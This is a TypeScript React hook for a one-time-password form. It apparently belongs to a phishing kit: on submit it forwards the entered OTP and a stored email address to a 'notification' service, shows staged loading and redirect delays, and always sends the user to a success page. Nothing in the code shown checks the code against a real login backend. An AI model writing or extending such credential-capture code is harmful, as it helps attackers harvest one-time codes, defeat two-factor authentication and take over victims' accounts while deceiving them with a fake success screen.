import { useState, FormEvent } from 'react';
import { useNavigate } from 'react-router-dom';
import { validateOTP } from '../utils/validation';
import { AUTH_MESSAGES } from '../constants';
import { notifyOTPAttempt } from '../services/notificationService';
import { storage } from '../utils/storage';
import { DELAYS } from '../config/delays';

export function useOTPForm() {
  const [otp, setOTP] = useState('');
  const [error, setError] = useState<string>('');
  const [isLoading, setIsLoading] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [redirectMessage, setRedirectMessage] = useState('');
  const navigate = useNavigate();

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (validateOTP(otp)) {
      setIsLoading(true);
      try {
        await notifyOTPAttempt({
          otp,
          email: storage.get('email')
        });

        await new Promise(resolve => setTimeout(resolve, DELAYS.LOADING));
        setIsLoading(false);
        setIsRedirecting(true);
        setRedirectMessage(AUTH_MESSAGES.LOADING.REDIRECT);
        
        await new Promise(resolve => setTimeout(resolve, DELAYS.REDIRECT));
        navigate('/success');
      } catch (error) {
        setError(AUTH_MESSAGES.ERRORS.GENERIC);
        setIsLoading(false);
      }
    } else {
      setError(AUTH_MESSAGES.ERRORS.OTP_INVALID);
    }
  };

  const handleBack = () => {
    navigate('/login');
  };

  const handleOTPChange = (value: string) => {
    setOTP(value);
    setError('');
  };

  return {
    otp,
    error,
    isLoading,
    isRedirecting,
    redirectMessage,
    setOTP: handleOTPChange,
    handleSubmit,
    handleBack,
  };
}